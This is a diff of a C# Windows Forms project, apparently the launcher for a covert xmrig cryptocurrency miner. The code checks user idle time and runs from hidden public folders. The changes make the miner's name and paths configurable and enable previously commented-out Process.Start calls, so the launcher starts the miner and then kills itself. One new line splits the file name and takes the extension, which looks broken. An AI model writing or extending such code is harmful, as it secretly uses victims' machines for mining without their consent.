@@ -24,7 +24,7 @@ namespace WindowsFormsApp1
 
         // WorkInProgConfigFile config = new WorkInProgConfigFile();
 
-
+        string nameOfProgrammToStart;
         bool prog_started;
         string textTranslit;
         int idleTimeOld;
@@ -36,20 +36,14 @@ namespace WindowsFormsApp1
         public Form1()          //Инициализация формы
         {
             InitializeComponent();
-            
-            //узнает дату при включерии. можно сделать и так, для компактрости
-            //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
-            //Это можно разделять как хочешь. Можно оставить только дату или только время
-
 
             //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
             Timer tmrShow = new Timer();
-            tmrShow.Interval = 1;
+            tmrShow.Interval = 300;
             tmrShow.Tick += tmrShow_Tick;
             tmrShow.Enabled = true;
 
-            progStartName = @"C:\Users\Public\Favor";
-            rigDirectory = @"C:\Users\Public\Documents\Distance";
+
 
             string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
                 for (int i = 0; i < (path.Length - 1);)
@@ -62,6 +56,13 @@ namespace WindowsFormsApp1
                         thisProgrammDirectory = thisProgrammDirectory + @"\";
                     }
                 }
+
+            WorkInProgConfigFile config = new WorkInProgConfigFile();
+            nameOfProgrammToStart = config.GetData("name_of_started_programm");
+            progStartName = config.GetData("place_of_the_executing_program");
+            rigDirectory = config.GetData("the_second_place_of_the_executing_program");
+
+
             //LogFile l = new LogFile();
             LogFile.Log("\n");
             LogFile.Log("started " + DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss"));
@@ -99,13 +100,6 @@ namespace WindowsFormsApp1
             else if (hiden == false && progStartName != thisProgrammDirectory)      //если программа не в правильном месте
             { 
                 hiden = true;
-
-                WorkInProgConfigFile config = new WorkInProgConfigFile();
-                string result = "start";
-                config.SetData(result, "1");
-                //config.GetData(result);
-                MessageBox.Show(config.GetData("э"));
-
 
                 LogFile.Log("Programm is not on wright plase.");
                 idleTimeOld = Convert.ToInt32(DateTime.Now.ToString("ss"));
@@ -211,10 +205,8 @@ namespace WindowsFormsApp1
                 if (idleTimeOld <= 57)
                 {
                     if (idleTimeOld == timeInt-3)
-                    { 
-                        //пока выключил
-                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
-                        //Process.Start(@"C:\Users\Public\Favor\start.bat");
+                    {
+                        Process.Start(progStartName + nameOfProgrammToStart);
 
                         Process.GetCurrentProcess().Kill();
                     }
@@ -223,9 +215,7 @@ namespace WindowsFormsApp1
                 {
                     if (timeInt == 2)
                     { 
-                        //пока выключил
-                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
-                        //Process.Start(@"C:\Users\Public\Favor\start.bat");
+                        Process.Start(progStartName+nameOfProgrammToStart);
                         Process.GetCurrentProcess().Kill();
                     }
                 }
@@ -242,7 +232,7 @@ namespace WindowsFormsApp1
                 //создаём экземпляр процесса, чтобы запустить прогу
                 System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
                 //задаём путь и имя до проги
-                srartProg.StartInfo.FileName = rigDirectory+ @"\xmrig.exe";
+                srartProg.StartInfo.FileName = rigDirectory+ @"\"+ nameOfProgrammToStart;
                 //запускаем саму прогу
                 srartProg.Start();
                 //возьмём уникальный код проги, чтобы её наути
@@ -264,7 +254,8 @@ namespace WindowsFormsApp1
 
         private void close_prog()
         {
-            Process[] processList = Process.GetProcessesByName("xmrig");
+            string[] name = nameOfProgrammToStart.Split('.');
+            Process[] processList = Process.GetProcessesByName(name[1]);
             try
             {
                 if (processList.Length != 0)
